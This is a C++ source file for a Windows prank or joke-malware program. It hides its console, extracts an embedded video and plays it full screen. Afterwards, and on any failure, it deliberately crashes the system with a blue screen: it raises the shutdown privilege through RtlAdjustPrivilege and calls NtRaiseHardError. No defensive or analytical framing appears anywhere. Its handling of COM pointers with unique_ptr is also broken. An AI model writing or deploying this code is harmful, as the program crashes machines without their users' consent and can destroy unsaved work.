#include <windows.h>
#include <dshow.h>
#include <memory>

// Externs for BSoD stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// Smart pointers for DirectShow interfaces
std::unique_ptr<IGraphBuilder> graph;
std::unique_ptr<IMediaControl> control;
std::unique_ptr<IMediaEvent> event;
std::unique_ptr<IVideoWindow> window;

// Function to trigger BSoD
ULONG TriggerBSOD() {
    BOOLEAN state;
    ULONG response;

    RtlAdjustPrivilege(19, TRUE, FALSE, &state); // Adjust privileges
    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // Raise BSoD

    return response;
}

// Function to get the video resource
void GetVideoResource(LPWSTR* path) {
    // Get the video resource
    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);

    if (resource == NULL) {
        TriggerBSOD(); // If resource not found, trigger BSoD
    }

    // Get resource data
    DWORD size = SizeofResource(NULL, resource);
    LPVOID data = LockResource(LoadResource(NULL, resource));

    if (data == NULL) {
        TriggerBSOD(); // If resource data not retrieved, trigger BSoD
    }

    // Create temporary file path
    *path = new WCHAR[MAX_PATH];

    GetTempPathW(MAX_PATH, *path);
    StringCbCatW(*path, MAX_PATH, L"video.wmv");

    // Create and write to the temporary file
    HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;

    if (file == INVALID_HANDLE_VALUE) {
        TriggerBSOD(); // If file creation failed, trigger BSoD
    }

    if (!WriteFile(file, data, size, &written, NULL) || written != size) {
        TriggerBSOD(); // If writing to file failed, trigger BSoD
    }

    // Close the file handle and free the resource
    CloseHandle(file);
    FreeResource(resource);
}

// Function to initialize DirectShow
void InitializeDirectShow(LPCWSTR path) {
    // Initialize COM
    CoInitialize(NULL);

    // Create DirectShow objects
    graph.reset();
    control.reset();
    event.reset();
    window.reset();

    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

    graph->QueryInterface(IID_IMediaControl, (void**)&control);
    graph->QueryInterface(IID_IMediaEvent, (void**)&event);
    graph->QueryInterface(IID_IVideoWindow, (void**)&window);

    // Render the video file
    graph->RenderFile(path, NULL);

    // Set video window to full screen mode
    window->put_FullScreenMode(OATRUE);
}

int main() {
    LPWSTR path;
    
    HRESULT result;
	LONG code;

    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide console window

    GetVideoResource(&path); // Get the video resource
    InitializeDirectShow(path); // Initialize DirectShow

    result = control->Run(); // Play the video

	if (SUCCEEDED(result)) {
		event->WaitForCompletion(INFINITE, &code); // Wait for the video to finish
	}

    // Trigger BSoD after attempting to play the video
    TriggerBSOD();

    // In case BSoD fails, return 1
    return 1;
}
